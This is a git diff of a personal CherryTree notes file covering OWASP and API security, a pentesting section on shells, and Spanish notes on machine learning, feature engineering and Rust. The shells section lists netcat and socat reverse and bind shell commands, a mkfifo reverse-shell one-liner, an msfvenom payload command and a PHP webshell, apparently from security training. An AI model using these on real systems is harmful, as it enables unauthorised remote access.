+- unnecesary faetures enabled
+- default accounts
+- error messages that are overly
+- not using http security headers
+
+Vulnerable and outdated components
+- don't update software of company
+- found in exploit-DB
+
+Identification and authentication failures
+- common use username and password
+- use of:
+   → brute force attacks: using username and password, use of multiple auth attemps
+   → weak credentials: use of common passwords is possible access to apps
+   → weak session cookies: predectible values
+
+software and data integrity failures
+- malicious modifications
+- hash is used to check modifications
+- software integrity failures:
+   → change of code by hackers
+   → injection of malicious code
+   → is possible use integrity={hash} in script tag to avoid errors
+- data integrity failures
+   → avoid use of usernames in cookies
+   → good solution is JWT
+
+security logging and monitoring failures
+- logging is esencial to check incidents
+- significant impacts:
+   → regulatory damage: attacker has gained access to personally identifiable user information
+   → risk of further attacks: presence may be undetected without logging
+
+Server-Side Request Forgery (SSRF)
+- attacker can coerce a web application into sending request on their behalf to arbitrary destinations
+
+PRATICAL TOP 10 ---------
+Inyection
+- user input is interpreted as commands
+- exists 2:
+   → SQL injection, passed like sql queries
+   → Command injection, passed like system command
+
+API SECURITY -------
+- BOLA (Broken Object Level Authorisation)
+   → refers to Insecure Direct Object Reference, using input to get access to the resource they are not authorised
+- BUA (Broken User Authentication)
+   → api with sensitive data
+   → access to database or adquire higher privilege
+- Excesive Data Exposure
+   → disclose more than desired information
+   → not consideration sensitivity level
+- Lack of Resources &amp; Rate Limiting
+   → any restriction on the frequency of clients' requested
+   → uso to avoid DoS
+   → excesive resource utilisation in network, storage, compute, etc
+- Broken function Level Authorisation
+   → access to confidential data by impersonating a high privileged user (admin)
+   → access to administrative functions
+- Mass Assigment
+   → submit more data of necesary, for example change username because the model is not well filtered 
+- Security Misconfiguration
+   → incorrect and poorly configured security controls
+   → incomplete default configuration
+   → publically accessible cloud storage
+   → Cross-Origin resource sharing
+   → error message with displayed sesitive data
+- Injection
+   → user input is not filtered and is directly processed by an API
+   → use of SQL Injection or OS injection
+- Improper Assets Management
+   → use of tweo version of an API available in our system
+   → V1 is active with V2
+   → in V1 security is not updated
+- Insufficient Logging &amp; Monitoring
+   → there is not anough evidence available due to the absence of logging and monitoring mechanims</rich_text>
+    </node>
+    <node name="SAST" unique_id="173" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693355854" ts_lastsave="1693355859">
+      <rich_text>Automatization of testing for code analysis</rich_text>
+    </node>
+    <node name="Eternal Blue" unique_id="181" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696303470" ts_lastsave="1696303477">
+      <rich_text>Scan and learn what exploit this machine is vulnerable to</rich_text>
+    </node>
+    <node name="NMAP" unique_id="182" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696303602" ts_lastsave="1696303602"/>
+    <node name="Shells" unique_id="188" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1698636581" ts_lastsave="1699293931">
+      <rich_text>shell is used with CLI, bash and sh are examples of shell
+
+Tools:
+- netcat, swiss army knife to network
+- socat, netcat with steroids
+   → the syntax is more difficult
+   → nc is more common that socat
+- Metasploit - multi/handler, is a module of metasploit
+- Msfvenom, part of metasploit framework, used to generate payloads on the fly
+
+
+Used URLS:
+- </rich_text>
+      <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</rich_text>
+      <rich_text>
+- </rich_text>
+      <rich_text link="webs https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</rich_text>
+      <rich_text>
+- </rich_text>
+      <rich_text link="webs https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</rich_text>
+      <rich_text>
+
+Shells:
+- reverse shells, execute code that connects back to your computer, goods for bypass firewalls rules
+- bind shells, code executed on the target is used to start a listener attached to a shell directly on the target, protected using firewalls
+
+Netcat
+- basic tool in pentester
+- used to reverse shels: nc -lvnp {port}
+   → l is listener
+   → v is verbose output
+   → n not to resolve host name or use DNS
+   → p indicates port
+- common ports used 80, 443 and 53
+
+Netcat shell stabilisation
+- technique 1: python
+   → python -c ‘import pty;pty.spawn("/bin/bash")’, with python 2 or 3
+   → export TERM=xterm
+   → stty raw -echo; fg
+- technique 2: rlwrap, program that gives access to history, tab autocompletion
+   → use: rlwrap nc -lvnp {port}
+   → this techniques is used with windows
+- technique 3: socat
+   → python -m http.server 80
+
+Socat
+- similar to netcat
+- reverse shells
+   → socat TCP -L:{port} -
+   → win: socat TCP:{local ip}:{local port} EXEC:powershell.exe, pipes
+- bind shells
+   → socat TCP-L:{port} EXEC:"bash -li"
+- more stable reverse shell: socat TCP-L:{port} FILE:`tty`,raw,echo=0
+
+Socat encrypted shells
+- this is capable of create encrypted shells
+- steps
+   → openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt, to create certificate
+   → cat shell.key shell.crt &gt; shell.pem, to create .pem
+   → socat OPENSSL -LISTEN:{port},cert=shell.pem,verify=0 -, to reverse shell listener
+   → socat OPENSSL:{local ip}:{local port},verify=0 EXEC:/bin/bash
+- to bind shell
+   → socat OPENSSL-LISTEN:{port},cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+   → socat OPENSSL:{target ip}:{target port},verify=0 -
+
+Common shell payloads
+- use of msfvenom
+- nc -lvpn {port} -e {command}, with -e is possible execute a command, this is a netcat-tradicional
+- mkfifo /tmp/f; nc -lvpn {port} &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1;rm /tmp/f, this create a named pie, and connect the nc to named pipe, and is used input, output and errput in the named pipe, this is a bind shell
+- with reverse shell: mkfifo /tmp/f; nc {local ip} {port} &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1; rm /tmp/f
+
+msfvenom
+- used to generate code for primarily reverse and bind shell
+- used in lover-level exploit
+- create payloads in various formats, exe, aspx, war, py
+- syntax: msfvenom -p {payload} {options}
+- example: msfvenom -p windows/x64/shell/reverse_ftp -f exe -o shell.exe LHOST={liste ip} LPORT={listen port}
+- type of payloads
+   → staged, payloads are sent in 2 parts, the first is stager, waiting connections, but does not contains reverse shell, this does not touch the disk, metasploit is added before
+   → stageless, more common, self-contained
+- meterpreter, metasploit's own brand of fully-featured shell, completely stable to work with windows target
+- payload naming conventions
+   → {OS}/{arch}/{payload}
+   → {OS}/{payload}, to windows 32
+   → stageless are denoted with underscore
+   → windows/x64/meterpeter/reverse_tcp to use meterpreter
+
+Metasploit multi/handler
+- milti/handler is a superb tool for catching reverse shells
+- commands:
+   → set PAYLOAD {payload}
+   → set LHOST {listen address}
+   → set LPORT {listen port}
+- to launch: exploit -j, this is necesary sudo permissions
+- session {id} to foreground
+
+Webshell
+- exists web servers with opportunities to use like webshells, common with PHP or ASP
+- basic webshell: &lt;?php echo “&lt;pre&gt;” . shell_exec($_GET["cmd"]) . “&lt;/pre&gt;”; ?&gt;
+- </rich_text>
     </node>
   </node>
   <node name="English" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1624747640" ts_lastsave="1685941303">
@@ -9198,7 +10005,7 @@ Adverbs and adjectives
 - adverbs = adjectives + -ly</rich_text>
     </node>
   </node>
-  <node name="Ciencia de datos" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617689129" ts_lastsave="1674689635">
+  <node name="Ciencia de datos" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617689129" ts_lastsave="1697502469">
     <node name="examenes de secciones" unique_id="115" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664320597" ts_lastsave="1664407685">
       <rich_text>¿Cuál es el orden correcto al solucionar una operación aritmética?
 La estructura adecuada de argumentos dentro de la función condicional "SI" es:
@@ -11972,7 +12779,7 @@ Analisis Bivariado
 Paradoja de simpson
 - es un fenomeno en el cual se pueden concluir dos cosas totalmente opuestas a partir de los mismos datos, dependiendo el como se clasifican estos</rich_text>
     </node>
-    <node name="machine learning curso udemy" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664229102" ts_lastsave="1665437609">
+    <node name="machine learning curso udemy" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1664229102" ts_lastsave="1698801932">
       <rich_text>p = t</rich_text>
       <node name="que es el machine learning" unique_id="114" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664229117" ts_lastsave="1664739247">
         <rich_text>es un subdominio de la IA, proporciona a los sistemas la capacidad de aprender y mejorar automaticamente, sin ser programados para ellos, es generalmente crear un modelo que se va mejorando con mas datos hacia el modelo a lo largo del tiempo (experiencia en datos)
@@ -12028,6 +12835,83 @@ Aprendizaje basado en instancias y basado en modelos
    → se requiere ajustar los parematros del modelo
    → aqui no se valida la distancia, es a traves del modelo</rich_text>
       </node>
+      <node name="regresion y clasificacion" unique_id="186" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697508639" ts_lastsave="1698189800">
+        <rich_text>Regresion Lineal
+- de aprendizaje supervisado, datos etiquetados
+- basado en modelos, funcion hipotesis de funcion lineal
+- es un modelo lineal
+- computa suma ponderada de las caracteristicas de entrada y sumando una variable llamada bias
+- predice valores continuos
+- linea que se ajusta a los datos que se dieron, es llamada funcion hipotesis
+- x variables de entrada (features), y variables de salida (target value), (x, y) ejemplo de entrenamiento (dataset)
+- h_theta(x) = theta_0 + theta(_1)x, es igual a la funcion de la recta, y = mx + n, 
+- theta cero dice donde cortara en las “y” y theta uno es la inclinacion
+- construccion del modelo, es buscar los parametros que generen la funcion hipotesis que mejor se adapte al conjunto de datos
+- se minimiza una funcion de coste (j_theta) para obtener los parametros optimos
+- funcion de coste, estas pueden variar, se pueden aplicar varias a los modelos
+- en regresion lineal generalmente se aplica MSE (mean squared error)
+- funcion de optimizacion, gradiente descendiente
+- esta muy ligada a la funcion de coste del algoritmo
+- se busca una funcion convexa, donde hay un minimo global... derivadas
+- se debe de buscar el minimo global de la funcion
+
+Regresion Logistica
+- predice un valor discreto, una clasificacion
+- supervisado, basado en modelos, modelo lineal generalizado
+- suma ponderada de las caracteristicas de entrada y sumando variable BIAS, se le aplica una funcion logistica
+- predice valores discretos
+- funcion hipotesis
+- se usa la funcion sigmoide g(z) = (1) / (1 + e^-z), donde z es la funcion lineal
+- problema de clasificacion binaria, aqui debe de encontrarse entre 0 y 1
+- se maneja por la probabilidad de que algo ocurra
+- se usa un threshold para decir si es cierto o falso
+- funcion de coste
+   → no se usa la misma que la de la regresion lineal
+   → se toma un grupo de los etiquetados como 1, se inicializa theta 0 y 1 de forma aleatoria y se crea una prediccion hasta encontrar el valor que se desea, se hace lo mismo con los valores de 1
+- funcion de optimizacion
+   → se usa la misma para la regresion lineal, gradiente descendiente</rich_text>
+      </node>
+      <node name="Creacion de proyectos" unique_id="190" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698801932" ts_lastsave="1699575193">
+        <rich_text>el conjunto de datos es una parte esencial en la resolucion de un problema, al nivel del algoritmo a usarse
+disponer de una cantidad suficiente de datos
+esencial utilizar un conjunto de datos que es representativo del problema practico
+los datos deben ser de calidad
+debe seleccionarse un conjunto de caracteristicas adecuado, minimizando el numero de caracteristicas irrelevantes
+
+las correlaciones ayudan para saber que la variable que modifica la salida pueden tomarse para usar con el modelo, es significativo
+correlacion entre diferentes caracteriscas que e comportan igual, se pueden eliminar, ya que representan practicamente lo mismo
+
+evitar overfitting y underfitting
+separacion por subconjuntos, entrenar, validar y probar
+overfitting, se ajusta demasiado bien al conjunto de datos de entrenamiento, aumentando el conjunto de datos si es posible, reduccion del numero de caracteristicas, utilizar algoritmos para la seleccion y extraccion de caracteristicas, regularizar
+underfitting, cuando los datos fallan mucho, para resolver este se debe seleccionar otro tipo de modelo mas complejo y con mas flexibilidad
+
+evaluacion de la hipotesis
+se requiere de una forma de evaluar la funcion hipotesis
+una o dos caracteristicas se puede representar graficamente
+pero con mas caracteristicas
+para evitar overfitting se usa un dataset que es de test el cual no conoce el modelo
+
+seleccion del modelo
+
+Preparacion del conjunto de datos
+- valores perdidos, el dataset puede tener valores perdidos en una determinada caracteristica
+   → se pueden eliminar el ejemplo del conjunto de datos
+   → eliminar la caracteristica
+   → asignar un valor determinado
+- valores categoricos, representaciones de texto, estos deben de cambiarse a valores numericos
+   → lo mas comun es usar encoding
+- escalado y estandarizado de caracteristicas
+   → diferentes escalas o valores muy impares
+   → escalar es usar valores entre 0 y 1
+   → se calcula restando el valor minimo y dividiendo por el maximo menos el minimo
+   → en la estandarizacion se busca tener una media de cero y una desviacion estandar de uno
+- desequilibrio de datos
+   → datos con pocos datos positivos y muchos negativos
+   → hacer oversample
+   → seleccionar un subconjunto
+   → modificar la funcion de error, para que la minoria tenga mas influencia en el modelo</rich_text>
+      </node>
     </node>
     <node name="data eng zoomcamp" unique_id="135" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1674689635" ts_lastsave="1675719767">
       <rich_text>--iidfile string
@@ -12041,6 +12925,282 @@ Long Island City/Queens Plaza
 447,770
 </rich_text>
       <rich_text family="monospace">0 5 1 * *</rich_text>
+    </node>
+    <node name="ingenieria de variables" unique_id="185" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1697502469" ts_lastsave="1699585817">
+      <rich_text># Tipos de variables
+- cualquier caracteristica, numero o cantidad que puede ser medida o contada
+- se pueden clasificar en dos:
+   → Numericas
+      ⇒ discretas
+      ⇒ continuas
+   → Categoricas
+      ⇒ nominales
+      ⇒ ordinales
+      ⇒ fecha/hora
+- Variables numericas
+   → variables que son numeros
+   → numeros enteros son variables discretas
+   → cualquier valor en un rango, son variables continuas
+- variables categoricas
+   → tambien conocidas como etiquetas
+   → pueden o no tener un orden logico
+   → pueden ser cadenas o numeros
+   → ordinal
+      ⇒ categoricas que representan una catagoria o grupo con alguna clasificacion intrinseca, toma una escala preestablecida que tiene sentido
+   → nominal
+      ⇒ valores representan catagorias que no obedecen a una clasificacion u orden logico
+- variables de fecha y hora
+   → uso de fechas, horas o fechas y horas
+- variables mixtas
+   → numeros y categorias entre sus valores
+
+Caracteristicas de las variables
+- datos faltantes
+   → datos ausentes o valores vacios, no estan disponibles para observaciones de variables
+   → son un problema en la mayoria de las fuentes de datos
+   → tienen un gran impacto en las conclusiones
+   → razones por incompletos:
+      ⇒ no se guardo apropiadamente
+      ⇒ se divide entre 0
+      ⇒ no estan disponibles o no se identifican
+   → impacto:
+      ⇒ incompatibles con sklearn
+      ⇒ la sustitucion puede distorcionar la distribucion de la variable
+      ⇒ afecta a todos los modelos de ML
+   → mecanismos:
+      ⇒ MCAR, completamente aleatorios, la probabilidad de que un valor falta es la misma para todas las relaciones, no hay relacion entre este y otro valor, omitir los valores no sesga ninguna inferencia o conclusiones hechas
+      ⇒ MNAR, faltantes no aleatorios, mecanismo o razon por la cual los valores son introducidos en los datos, es algo externo lo que los afecta
+      ⇒ MAR, faltantes aleatorios, la probabilidad de ocurrencia de los datos depende la informacion disponible
+- cardinalidad
+   → variables categoricas, estas etiquetas se conocen como cardinalidad
+   → si numero de etiquetas es alto tiene alta cardinalidad
+   → efectos:
+      ⇒ strings incompatibles con SKLearn
+      ⇒ distribucion desigual entre sets de training y test
+      ⇒ sobre ajustes en algoritmos basados en arboles
+      ⇒ probelmas operacionales
+   → variables con muchas etiquetes tienden a dominar algunas con menos
+   → muchas etiquetas puede introducir mucho ruido y poca informacion
+   → reduccion de cardinalidad para mejorar el ML
+   → problemas operacionales:
+      ⇒ con etiquetas nuevas en el segmento de prueba, no se puede calcular estas nuevas, aqui lanza un error
+- Categorias poco comunes
+   → aparecen solo en una pequenia proporcion de los datos
+   → se tiene las mismas consideracion que con las categorias de alta cardinalidad
+   → se agrupan las categorias poco comunes para que no afecte tanto o eliminarlas
+- distribuciones
+   → funcion que describe como se espera que dicho suceso ocurra
+   → la suma de las probabilidades debe ser 1
+   → la probabilidad para un valor debe de estar entre 0 y 1
+   → distribucion normal, la mas conocida, muchas observaciones la tiene, es simetrica, la probabilidad decrece en ambas colas
+   → para una distribucion normal podemos aplicar la media para la imputacion
+   → si es asimetrica, se debe usar la mediana
+   → modelos lineales, normalmente distribuidas
+   → otros modelos no imponen condiciones
+   → una buena distribucion puede mejorar el desempenio
+   → transformacion para mejorar la distribucion, apliicando transformacion matematicas o discretizando las variables (binning) agrupando los valores de las variables
+- valores extremos
+   → outlier, significativamente diferente al resto de los datos
+   → son completamente diferentes
+   → dependen del contexto pueden tratarse o ignorarse
+   → los outliers salen del alcance del curso
+   → los que mas afectan son las regresiones lineales
+   → adaboost es otro modelo que le afecta
+- magnitud o escala de las variables
+   → en los modelos lineales esto influye en los modelos, variables con rango mayor de valores tienden a dominar
+   → descenso de gradiente, converge mas rapido
+   → svm, encuentr mas rapido los vectores de soporte
+   → medidas de distancia, son sensibles a la escala
+   → afectan mas a los que son en distancia
+   → afectan menos a los que tienen que ver con arboles
+
+Datos faltantes
+- tratamiento de casos completos, eliminacion por lista
+   → descartar todas las observaciones donde faltan alguno de los datos
+   → solamente se invluyen los asos que tienen observaciones completas
+   → MCAR, solo de falta aleatoria
+   → facil de implementar
+   → no requiere manipulacion de datos
+   → mantiene distribucion de variables
+   → excluye gran proporcion de los datos
+   → observaciones importantes son eliminadas
+   → genera un sesgo si los datos no son representativos
+   → modelos no podran predecir cuando esten los datos faltantes 
+   → solo si el 5% de los datos contiene observaciones incompletas
+- sustitucion de datos faltantes por la media o mediana
+   → se usa la media si la variable esta normalmente distribuida o la mediana si la variable tiene una distribucion sesgada
+   → se puede usar con variables numericas
+   → se usan con datos faltantes de forma aleatoria
+   → el valor original sea el que muestran la mayoria de las observaciones
+   → facil de implementar
+   → forma rapida de obtener conjuntos completos de datos
+   → puede ser integrado en produccion
+   → distorcion de la distorcion original
+   → distocion de la varianza y covarianza con las otras variables
+   → solo el 5% tiene datos faltantes
+- imputacion con valor arbitrario
+   → consiste en reemplazar todas las ocurrencias por un valor cualquiera
+   → tipicamente se usan 0, 999, -999, combinaciones de 9 o -1 (si la distribucion es positiva)
+   → categoricas o numericas, aunque gteneralmente es usada en categoricas
+   → el valor no debe coincidir con la media o mediana
+   → datos no faltan de forma aleatoria
+   → queremos marcar que el dato faltante es distinto
+   → facil de implementar
+   → forma rapida de obtener conjuntos completos
+   → puede ser integrado en produccion
+   → captura la importancia de la ausencia
+   → distorciona la distribucion original
+   → distorciona la varianza
+   → distorciona la covarianza con las otras variables
+   → este puede generar valores extremos
+   → el valor debe de ser escogido cuidadosamente, no moda, mediana o moda
+- imputacion al borde de la distribucion
+   → equivalente a la sustitucion por valores arbitrarios, automaticamente por uno al final de la distribucion de la variable
+   → si la variable esta normalmente distribuida se usa el promedio mas o menos 3 veces la desviacion estandar
+   → si es asimetrica, su usa la regla de proximidad entre-cuartil
+   → aprende valores de los datos
+   → necesitamos dividir el dataset en entrenamiento y prueba
+- imputacion por categoria mas frecuente o moda
+   → reemplaza todas las ocurrencias usando la moda
+   → se puede usar con variables categoricas o numericas
+   → es mas usado por variables categoricas
+   → valores faltan de manera aleatoria
+   → la mayoria de observacion son parecidas
+   → facil de implementar
+   → puede ser integrada en produccion
+   → distorciona la relacion entre variables
+   → lleva a la sobrerepresentacion
+   → se usa con MCAR
+   → los datos faltantes son del 5%
+- Sustitucion usando etiqueta missing
+   → valores faltantes toman categoria faltantes
+   → metodo mas usado para variables categorias
+   → facil de implementar
+   → puede ser integrado en prod
+   → captura la ausencia
+   → no asume los datos faltantes
+   → si NA es bajo, crear una vategoria adicional produce sobre ajusteen los arboloes de decision
+- sustitucion por muestras aleatorias
+   → para variables numericas y categoricas
+   → tomar observaciones aleatorias en donde existen y usar esos valores para los faltantes
+   → uso cuando es MCAR
+   → reemplazar una poblacion con datos con la misma distribucion
+   → facil de implementar
+   → puede ser integrado en produccion
+   → preserva la varianza de la variable
+   → aleatoriedad
+   → se pueden traer valores valores distintos en cada ronda de prediccion
+   → puede distorcionar las relaciones entre variables
+   → consume mucha memoria en produccion
+   → se debe fijar una semilla para que la imputacion no sea variable
+- idicador binario de datos faltantes
+   → binaria adicional que se agrega para datos faltantes
+   → variables numericas y categoricas
+   → se agrega en una columna de mas
+   → el reemplazo se puede hacer con otras tecnicas
+   → datos no faltan de manera aleatoria
+   → genera variable adicionales
+   → la variable original todavia tiene que ser sustituida
+   → muchos indicadores terminan siendo identicos o altamente correlacionados
+   → se usan mucho en competencias de data
+- SimpleImputer
+   → transformador de la libreria scikit learn
+   → permite usar gridsearch
+   → se pueden usar diferentes valores
+   → limitaciones
+      ⇒ retorna un arrray en lugar de un dataframe
+      ⇒ necesita clases adicionales para seleccionar cuales variables sustituir
+      ⇒ no es tan sencillo de usar
+   → se usa columntransformer
+   → para reemplazo valor arbitrario se usa strategy='constant', fill_value={valor}
+
+Feature engine - lib
+- incluye todas las tecnicas de imputacion
+- funcion como sklearn
+- permite implementar en un grupo selecto de variables
+- puede ser integrado con los Pipelines de sklearn
+
+Codificacion de variables categoricas
+- proceso de reemplazar etiquetas por una representacion numerica
+- producir varibles para ML
+- construir variables predictivas
+- relacion monotonica
+   → cuando la variable incrementa, incrementa el valor del target
+   → cuando la variable incrementa, el valor del target decrece
+   → mejoran el desenpeno en modelos lineales, tambien en arboles de decision
+   → se prefiera incluir restricciones monotonicas
+   → para las etiquetas raras se usa one hot para categorias mas fecuentes y agrupacion de las poco frecuentes
+- codificacion one hot:
+   → cada categoria es reemplazada con una varible binaria tambien llamada dummy
+   → la variable toma el valor 1 o 0, si la categoria esta presente
+   → tambien puede hacerse con k - 1 variables
+   → con binarias se usa una variable binaria
+   → ayuda a reducir por una dimension con k-1
+   → a veces es mejor usar k variables, por ejemplo con arboles, seleccion de variables de forma recursiva, cuando se quiere saber la importancia de cada una de las categorias de los datos
+   → ventajas
+      ⇒ no asume o impone condiciones en la distribucion de la variable o de las categorias
+      ⇒ mantiene toda la informacion
+      ⇒ es apropiada para modelos lineales
+   → limitaciones
+      ⇒ incrementa el dataset
+      ⇒ no añade informacion adicional
+      ⇒ muchas variables dummy pueden ser identicas
+- codificacion de categorias mas frecuentes
+   → crear dummies pra cateorias mas frecuentes
+   → ventajas
+      ⇒ facil de implementar
+      ⇒ no requiere horas en la exploracion
+      ⇒ no genera numero extremadamente alto de nuevas variables
+      ⇒ adecuado para modelos lineales
+   → limitaciones
+      ⇒ genera nuevas variables
+      ⇒ no retiene informacion adicional de las etiquetas ignoradas
+      ⇒ se hace un count group by oreder by limit para obtener los datos... en lenguaje SQL
+- Codificacion ordinal
+   → reemplazo de una categotia por digitos o numeros enteros del 1 a n o de 0 a n - 1
+   → los numeros se asignan arbitrareamente
+   → permite rapuda evaluacion comparativa en los modelos de ML
+   → facil de implementar
+   → no genera ams variables
+   → puede funcionar con arboles de decision
+   → no anade orden arbitrario
+   → no es bueno para modelos lineales
+   → no maneja nuevas categorias
+- codificacion con frecuencias o cuentas
+   → se reemplaza por el numero o porcentaje de observaciones
+   → captura la representacion de cada etiqueta
+   → metodo popular en kaggle
+   → supuesto: el numero de observaciones de cada categoria predice el valor del target o vaiable objetivo
+   → facil de implementar
+   → no genera variables
+   → funciona bien con arboles
+   → no sirve para modelos lineales
+   → no maneja categorias adicionales
+   → si dos categorias aparecen iguales en cantidad se puede perder informacion
+- Codificacion guiada por la variable objetivo
+   → guiadas por la variable objetivo
+   → crean relacion monotica entre variable y target
+   → ordena las categorias de acuerdo al targetr
+   → numero de 1 a k, k es el numero de vategorias distintas en la variable
+   → enumeracion guiada por el valor promedio del target
+   → facil de implementar
+   → no genera multiples variables
+   → crea una relacion monotonica entre las vategorias y el target
+   → puede causar sobreajustes
+   → dificil de implementar con validacion cruzada
+- Codificacion con la media del target
+   → se reemplaza la categoria con el valor medio del target
+   → facil de implementar
+   → no genera multiples variables
+   → crea una relacion monotonica
+   → puede causar sobreajustes
+   → dificil de implmentar con vlidacion cruzada
+   → si 2 tienen el mismo promedio del target se pierde informacion
+- Codificacion con proporcion de probabilidades
+   → proporcion de la probabilidad de que el target sea 1 o 0, este solo usa cuando es binario
+- Peso de la evidencia
+   → evaluacion de datos o informacion
+   → evaluacion de incumplimientos de pago de prestamos p deudas</rich_text>
     </node>
   </node>
   <node name="JS" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625688385" ts_lastsave="1630594410">
@@ -12540,7 +13700,7 @@ Representación gráfica
 Que es una derivada?
 </rich_text>
     </node>
-    <node name="estadistica" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1657140372" ts_lastsave="1663530127">
+    <node name="estadistica" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1657140372" ts_lastsave="1697594653">
       <rich_text>base de la estaditica
 - que es una muestra?
    → subconjunto de algo mas grande (poblacion)
@@ -12557,7 +13717,7 @@ Los tres analisis descriptivos fundamentales
    → resumir analizar y sacar conclusiones
    → se divide en
       ⇒ tablas de frecuencia
-         •  se tienen las clases
+         • se tienen las clases
          • frecuencia absoluta, total por clase
          • frecuencia absoluta acumulativa, sumar una tras la otra
          • frecuencia relativa, la frecuencia absoluta / total (porcentaje)
@@ -12671,7 +13831,7 @@ Tipos de funciones
 - </rich_text>
     </node>
   </node>
-  <node name="Nuevos lenguajes" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617842349" ts_lastsave="1672690232">
+  <node name="Nuevos lenguajes" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617842349" ts_lastsave="1698688730">
     <node name="Algoritmos y pensamiento logico" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617842365" ts_lastsave="1641884633">
       <rich_text>en python con () se hace un generator expresion que es como una lista pero mas potente, ocupa menos memoria
 
@@ -13506,6 +14666,110 @@ CH:
         <rich_text>arithmetic &amp; sizeof
 - helo</rich_text>
       </node>
+    </node>
+    <node name="estructuras de datos" unique_id="172" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692850245" ts_lastsave="1692852718">
+      <rich_text>Arrays
+- basic data structure
+- store one more value
+- does not increase table of symbol table, this is complex
+- exists:
+   → one dimensional
+   → multidimensional
+      ⇒ two
+      ⇒ three
+- formula for index: A[i] = Base Address + i * datasize
+   → in C the formula is pointer</rich_text>
+    </node>
+    <node name="Rust" unique_id="187" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="40" is_bold="0" foreground="" ts_creation="1698026179" ts_lastsave="1698690008">
+      <rich_text>por que usar:
+- lenguaje mas amado por la comunidad
+- modo seguro, evita hacer codigo inseguro o feo
+- no tiene garbage collector
+- se pueden crear desde microcontroladores hasta videojuegos
+- lenguaje moderno con filosofia moderna
+- desventajas
+   → curva de aprendizaje muy pronunciada
+- variables se declaran `let {variable}: {tipo} = {valor}`
+- el println se maneja como macro: println!
+- con variables cadena se usan el &amp;
+- las variables son inmutables
+- para modificar variables debemos especificarle que son mutables asi: `let mut {variable}: {valor}`
+- dos formas de representar string: &amp;str y String
+- para capturar datos: `std::io::stdin().read_line(&amp;mut {variable}).unwrap();`
+- loop para hacer ciclos
+- unwrap es para manejo de errores, si existe devuelve el valor, de otras maneras truena
+- no existe el valor nulo
+- si existe o no se usa un Option&lt;T&gt;, siendo T el tipo base
+- los errores son un tipo de datos
+- los errores se devuelven del tipo Result&lt;T,E&gt;, T, tipo sin error y E el error
+- arrays y ciclos for
+   → los vectores se declaran: `let mut {vector} = Vec::new);`
+   → con tipo de dato: `let mut {vector}: Vec&lt;{tipo}&gt; = Vec::new();`
+- for se usa `for i in 0..3 {}` con variables: `for {var} in {array} {}`
+- vectores inmutables: `let {vector} = [{valores}]`, este no se pude modificar
+- para crear una funcion: `fn {nombre}({variables con tipo})`</rich_text>
+    </node>
